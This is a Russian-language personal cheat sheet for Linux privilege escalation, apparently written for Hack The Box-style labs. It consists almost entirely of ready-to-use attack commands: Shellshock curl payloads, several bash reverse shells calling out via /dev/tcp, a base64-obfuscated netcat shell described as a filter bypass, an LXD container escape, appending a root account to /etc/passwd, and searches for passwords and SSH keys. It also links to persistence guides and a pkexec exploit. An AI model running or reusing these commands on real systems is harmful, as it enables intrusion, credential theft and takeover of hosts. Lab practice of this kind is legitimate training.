# UP_PRIV_Linux
# pspy для поиска процессов

        wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
        scp pspy64 rebecca_smith@sorcery.htb:/tmp/pspy64

# Скрипты повышения привелегий 

        https://github.com/rebootuser/LinEnum

        https://github.com/rebootuser/LinEnum.git

        https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

        wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh

# enumeration

дистрибутив;

        cat /etc/issue
        cat /etc/*-release

версия ядра и разрядность;
       
        cat /proc/version
        uname -a

сетевые интерфейсы, порты, службы;
        
        netstat
        ss -tulpn

процессы
       
        ps aux
        ps -ef
        pspy64 (Надо скачивать)

        https://github.com/DominicBreuker/pspy

        wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64s       

Файлы, которые стоит проверить

        /home/user/.bash_history
        /home/user/password.txt
        /home/user/.history
        /home/user/.mysql_history
        /home/user/.ssh/id_rsa

# Разрешенные пермишены

        Sudo -l

        getcap -r / 2>/dev/null

# Sudo misconfig

        all versions below 1.8.28

# SUID SGID

        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
        find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
        
# поиск capabiliti
        find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;


# для вычисления crontab

        https://github.com/DominicBreuker/pspy


# LXC LXD
        container-user@nix02:~$ id
        uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

        container-user@nix02:~$ cd ContainerImages
        container-user@nix02:~$ ls

        ubuntu-template.tar.xz
        container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
        container-user@nix02:~$ lxc image list

        container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
        container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
        lxc start privesc

        container-user@nix02:~$ lxc exec privesc /bin/bash
        root@nix02:~# ls -l /mnt/root



curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh

curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&1" http://10.8.0.10/cgi-bin/shell.sh


http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}

bash -c "bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"

/bin/bash -c 'bash -i >& /dev/tcp/192.168.50.123/4444 0>&1'

echo "system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'\")" > file.plt

echo bmMgMTkyLjE2OC41MC4xMjMgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | bash   (обход фильтрации)



https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php   (Лучший PHP)

https://www.revshells.com/


# Повысить до tty интелектуальной оболочки командой 

python3 -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm

/bin/bash -p - это команда запуска интерпретатора командной строки Bash с флагом -p, который означает "privileged mode" (привилегированный режим).

# Найти файлы владельцем которого является группа

        find / -group bugtracker 2>/dev/null

# Найти файлы владельцем которого является пользователь
        find / -type f -user emily 2>/dev/null
# Найти все файлы с пермишеном S

        find / -user root -perm -4000 -exec ls -ldb {} \;

        find / -user root -perm -u=s -type f 2>/dev/null

        find / -perm -u=s 2>/dev/null
# найти файл по имени

        find / -name "mysql*" 2>/dev/null
        find / -type f -name "*flag*.txt" 2>/dev/null 

# ПОИСК ПАРОЛЕЙ

        grep -r -I --color=always -w 'password' . 2>/dev/null 

        cat * | grep -i passw*

        grep -r "passw".

        grep -rni 'enter_network' (поиск везде от текущей)

        for i in $(grep -oP "('.*?')" -R . --no-filename);do x=$(echo -n $i | ent| grep Entropy| awk '{print $3}' ); echo "$x $i"; done | sort -n

(поиск всего, заключенного в  '   ' особенно для паролей с применением ентропии)

        grep -E '[A-Z]{1,9}[-_][a-z]{1,9}' -R .




# pkexec EXPLOIT

Как понять, подвержены ли ваши дистрибутивы уязвимости pkexec:

whereis pkexec

which pkexec

ls -la /usr/bin/pkexec

find / -type f -name pkexec

poc - https://github.com/arthepsy/CVE-2021-4034

# Полезные комманды Линукс

        https://putty.org.ru/articles/unix-linux-ref

# открыть gui 
        open .

# Добавление пользователя с правами root в /etc/passwd

        echo "boot:$(openssl passwd -6 -salt boot password123):0:0:boot:/root:/bin/bash" >> /etc/passwd

# Закрепление в системе

        https://habr.com/ru/articles/568298/
        https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md

# C
        gcc src.c -fPIC -shared -o /development/libshared.so компиляция бибилиотек
        gcc -o output input.c
        
